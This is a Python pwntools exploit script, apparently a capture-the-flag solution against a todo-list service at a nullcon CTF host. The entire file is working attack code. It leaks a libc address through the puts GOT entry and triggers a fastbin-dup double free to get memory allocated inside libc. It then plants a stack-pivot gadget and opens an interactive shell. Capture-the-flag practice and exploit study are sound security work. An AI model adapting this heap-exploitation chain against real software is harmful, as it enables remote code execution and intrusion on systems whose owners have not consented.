from pwn import *

MENU = '''
Menu:
(1) Create a new todo
(2) Set description for a todo
(3) Delete an existing todo
(4) Print todos
(5) Exit

> 
'''

PROMPT = "> "

def get_prompt():
	return p.recvuntil(PROMPT)

def create_todo(todo,interact=False):
	p.sendline("1")
	p.recvuntil("topic: ")
	p.sendline(todo)
	if interact:
		p.interactive()
	else:
		get_prompt()

def set_description(name,desc,desc_len):
	p.sendline("2")
	p.recvuntil("topic: ")
	p.sendline(name)
	p.recvuntil("Desc length: ")
	p.sendline(str(desc_len))
	p.recvuntil("Desc: ")
	p.send(desc.ljust(desc_len,"\x00"))
	get_prompt()

def list_todo():
	p.sendline("4")
	ret = {}
	data = get_prompt().strip(PROMPT).strip().split("\n")
	for x in data:
		key,value = x.split(" - ")
		ret[key] = value
	return ret

def delete_todo(todo):
	p.sendline("3")
	p.recvuntil("topic: ")
	p.sendline(todo)
	get_prompt()

p = remote("pwn.ctf.nullcon.net", 4003)
e = ELF("./libc.so.6")

puts_got = 0x601F90
strlen_got = 0x601F98

desc = "B"*0x8+p64(puts_got)
desc = desc.strip("\x00")

create_todo("1"*0x30)
set_description("1"*0x30,desc,len(desc))
create_todo("2"*0x30)
delete_todo("1"*0x30)
create_todo("3"*0x30)
create_todo("4"*0x30)

todos = list_todo()
LIBC = u64(todos["4"*0x30].ljust(8,"\x00")) - e.symbols['puts']

log.info("LIBC: 0x%x"%LIBC)

create_todo("a"*0x30)
create_todo("b"*0x30)
create_todo("c"*0x30)

set_description("a"*0x30,"DOBULE_FREED_CHUNK",0x60)
set_description("b"*0x30,"DUMMY_CHUNK",0x60)

delete_todo("a"*0x30)
delete_todo("b"*0x30)

create_todo("d"*0x30)
create_todo("e"*0x30)


target = LIBC + 0x3C4AF5 - 8

log.info("triggering double free...")
set_description("e"*0x30,p64(target),0x60)


create_todo("f"*0x30)
create_todo("g"*0x30)
create_todo("h"*0x30)

#add rsp, 0x218 ; ret
pivot = LIBC + 0xf1147
payload = "A"*3+p64(pivot)*3
set_description("f"*0x30,p64(0xcafebebe),0x60)
set_description("g"*0x30,p64(0xcafebebe),0x60)

log.info("getting LIBC's .data allocated via fastbin dup")
set_description("h"*0x30,payload,0x60) #GET IT ALLOCATED

log.success("popping shell!")
create_todo("\x00"*0x200,interact=True)
